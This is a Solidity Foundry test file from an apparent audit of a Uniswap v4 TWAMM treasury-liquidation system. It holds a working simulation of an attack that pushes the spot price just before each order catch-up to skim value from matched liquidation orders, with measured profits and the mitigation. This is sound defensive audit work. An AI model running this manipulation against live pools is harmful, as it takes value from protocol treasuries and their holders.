// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {console} from "forge-std/Test.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {ITWAMM} from "../src/dex/v4/twamm/vendor/ITWAMM.sol";

import {StocksRedemptionAdversarialTest} from "./StocksRedemption.adversarial.t.sol";

/// @notice Round 25: an opposing TWAMM order plus a price push just before each catch-up.
///
/// Two earlier conclusions were each tested on their own and never together:
///   - "an opposing TWAMM order can never make the treasury's liquidation worse" (round 14), and
///   - "sandwiching the liquidation always loses, the 10% cost on each leg is the defence" (round 2).
/// TWAMM nets opposing orders against each other at the pool's SPOT price at the start of each interval, with no
/// price impact and no bound on how far that spot may sit from where it was a block earlier. So an attacker who
/// holds an opposing order (selling TST into the treasury's stock) only has to move spot for the instant the
/// interval is caught up: the whole matched amount then fills at the pushed price, and the push is unwound
/// straight after. The push costs its round trip on the PUSH size; the gain is on the whole MATCHED size, so
/// the 10% cost per leg stops being a defence once the matched size is large enough.
///
/// Measured here against the real stack (pool stock depth ~42, a 24-interval liquidation, an attacker holding
/// 30M TST worth ~8.6 stock at spot, its order spanning the first two intervals):
///
///   hourly slice / pool stock    honest order    order + push    treasury TST burned (none / honest / push)
///   49%  (treasury 500, 2x push)    11.29           20.95         134.8M / 164.5M / 157.7M
///   20%  (treasury 200, 2x push)     8.49            9.20         120.5M / 149.4M / 141.9M
///   10%  (treasury 100, 1.5x push)   7.71            6.65         102.4M / 129.5M / 124.7M
///
/// So the push pays from roughly a 20% hourly slice upwards and loses below it. The treasury is never worse off
/// than with no counter-order at all (round 14's claim survives), but it burns 4-5% less TST than it would against
/// the same order left alone, and that difference is what the attacker takes. Graded Low: it needs a liquidation
/// several times the pool's own depth squeezed into the minimum duration, which is already a poor liquidation
/// before anyone attacks it. The lever that removes it is duration: the slice shrinks in proportion.
contract StocksAuditR25MatchedPriceManipulationTest is StocksRedemptionAdversarialTest {
    address attacker = address(0xA77AC4);

    function _liquidate(uint256 n) internal returns (uint256 committed, bytes32 orderId) {
        address gov = curve.governor();
        vm.prank(gov);
        (committed, orderId) = staking.liquidateTreasury(n);
    }

    uint256 intervals = 24;

    struct Outcome {
        uint256 tstBurnedByTreasury;
        int256 attackerStockNet; // attacker's stock at the end minus at the start (order proceeds minus push losses)
    }

    function _sellTst(address who, uint256 tstIn) internal {
        vm.startPrank(who);
        tst.approve(address(swapRouter), tstIn);
        swapRouter.swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: tstIsCurrency0,
                amountSpecified: -int256(tstIn),
                sqrtPriceLimitX96: tstIsCurrency0 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        vm.stopPrank();
    }

    /// @param treasuryStock what the treasury holds when it is liquidated
    /// @param attackerTst   size of the attacker's opposing order (0 = no attacker at all)
    /// @param pushX100      how far the attacker pushes the TST price before each catch-up, x100 (100 = no push)
    /// @param attackIntervals how many intervals the attacker's order spans (and how many catch-ups it pushes before)
    function _run(uint256 treasuryStock, uint256 attackerTst, uint256 pushX100, uint256 attackIntervals)
        internal
        returns (Outcome memory o)
    {
        _fundTreasury(treasuryStock);
        vm.warp(_now() + 1 hours);

        uint256 stockStart = 1_000_000e18;
        deal(address(stock), attacker, stockStart);
        if (attackerTst > 0) {
            deal(address(tst), attacker, attackerTst);
            vm.startPrank(attacker);
            tst.approve(address(hook), attackerTst);
            hook.submitOrder(
                ITWAMM.SubmitOrderParams({
                    key: key, zeroForOne: tstIsCurrency0, duration: attackIntervals * 1 hours, amountIn: attackerTst
                })
            );
            vm.stopPrank();
        }
        _liquidate(intervals);

        uint256 firstBoundary = _now() - (_now() % 1 hours) + 1 hours;
        for (uint256 i; i < intervals; ++i) {
            uint256 boundary = firstBoundary + i * 1 hours;
            uint256 bought;
            if (pushX100 > 100 && i < attackIntervals) {
                // one second before the boundary: push the TST price up by buying TST with stock
                vm.warp(boundary - 1);
                uint256 poolStock = stock.balanceOf(address(pm));
                uint256 netIn = (poolStock * Math.sqrt(pushX100 * 1e16)) / 1e9 - poolStock; // Rs * (sqrt(m) - 1)
                bought = _buyTst(attacker, (netIn * 100) / 98);
            }
            // at the boundary: the interval is caught up, matching the two orders at whatever spot is right now
            vm.warp(boundary);
            hook.executeTWAMMOrders(key);
            // and the push is unwound straight after
            if (bought > 0) _sellTst(attacker, bought);
        }

        vm.warp(firstBoundary + intervals * 1 hours + 1);
        uint256 burnedBefore = tst.balanceOf(BURN);
        staking.claimLiquidatedTst();
        o.tstBurnedByTreasury = tst.balanceOf(BURN) - burnedBefore;

        if (attackerTst > 0) {
            vm.startPrank(attacker);
            hook.syncAndClaimTokens(
                ITWAMM.SyncParams({
                    key: key,
                    orderKey: ITWAMM.OrderKey({
                        owner: attacker,
                        expiration: uint160(firstBoundary + (attackIntervals - 1) * 1 hours),
                        zeroForOne: tstIsCurrency0
                    })
                })
            );
            vm.stopPrank();
        }
        o.attackerStockNet = int256(stock.balanceOf(attacker)) - int256(stockStart);
    }

    function _report(string memory label, Outcome memory o) internal pure {
        console.log(label);
        console.log("   treasury TST burned (e18):", o.tstBurnedByTreasury / 1e18);
        console.log("   attacker stock net (1e15):");
        console.logInt(o.attackerStockNet / 1e15);
    }

    function _compare(uint256 treasuryStock, uint256 attackerTst, uint256 pushX100, uint256 attackIntervals)
        internal
        returns (Outcome memory a, Outcome memory b, Outcome memory c)
    {
        console.log("=== treasury stock / pool stock (e18), push x100, intervals ===");
        console.log(treasuryStock / 1e18, stock.balanceOf(address(pm)) / 1e18, pushX100, intervals);
        uint256 id = vm.snapshotState();
        a = _run(treasuryStock, 0, 100, attackIntervals);
        vm.revertToState(id);
        b = _run(treasuryStock, attackerTst, 100, attackIntervals);
        vm.revertToState(id);
        c = _run(treasuryStock, attackerTst, pushX100, attackIntervals);
        vm.revertToState(id);
        _report("A  no attacker", a);
        _report("B  honest opposing order, no push", b);
        _report("C  opposing order + push before every catch-up it spans", c);
    }

    /// @dev Hourly slice ~49% of the pool's stock: pushing the price nearly doubles what the same order earns.
    function test_LargeSlice_PushingSpotBeforeTheCatchUp_Pays_AndTheTreasuryBurnsLess() public {
        (Outcome memory a, Outcome memory b, Outcome memory c) = _compare(500e18, 30_000_000e18, 200, 2);

        assertGt(c.attackerStockNet, (b.attackerStockNet * 150) / 100, "the push earns over 1.5x the honest order");
        assertLt(c.tstBurnedByTreasury, b.tstBurnedByTreasury, "the treasury burns less than against the honest order");
        // Round 14's claim still holds: even the manipulated counter-order beats having no counter-order.
        assertGt(c.tstBurnedByTreasury, a.tstBurnedByTreasury, "but still more than with no counter-order at all");
        assertGt(b.tstBurnedByTreasury, a.tstBurnedByTreasury, "an honest opposing order helps the treasury");
    }

    /// @dev Hourly slice ~20% of the pool's stock: roughly the break-even. The push still pays, barely.
    function test_MediumSlice_ThePushIsNearBreakEven() public {
        (, Outcome memory b, Outcome memory c) = _compare(200e18, 30_000_000e18, 200, 2);
        assertGt(c.attackerStockNet, b.attackerStockNet, "the push still pays at a 20% slice");
        assertLt(c.attackerStockNet, (b.attackerStockNet * 115) / 100, "but by under 15%");
    }

    /// @dev Hourly slice ~10% of the pool's stock: the push costs more than it gains. This is the regime the
    /// round-2 sandwich test covered, and why it concluded an attacker always loses.
    function test_SmallSlice_ThePushLoses_TheCostPerLegIsTheDefence() public {
        (, Outcome memory b, Outcome memory c) = _compare(100e18, 30_000_000e18, 150, 2);
        assertLt(c.attackerStockNet, b.attackerStockNet, "pushing loses money at a 10% slice");
    }

    /// @dev Spreading the SAME treasury over more intervals shrinks the slice in proportion and flips the result.
    function test_LongerDuration_RemovesTheEdge() public {
        uint256 id = vm.snapshotState();
        (, Outcome memory b24, Outcome memory c24) = _compare(200e18, 30_000_000e18, 200, 2);
        vm.revertToState(id);
        intervals = 96; // four days instead of one: the slice drops from ~20% to ~5% of the pool's stock
        (, Outcome memory b96, Outcome memory c96) = _compare(200e18, 30_000_000e18, 200, 2);

        assertGt(c24.attackerStockNet, b24.attackerStockNet, "over 24 intervals the push pays");
        assertLt(c96.attackerStockNet, b96.attackerStockNet, "over 96 intervals the same push loses");
    }
}
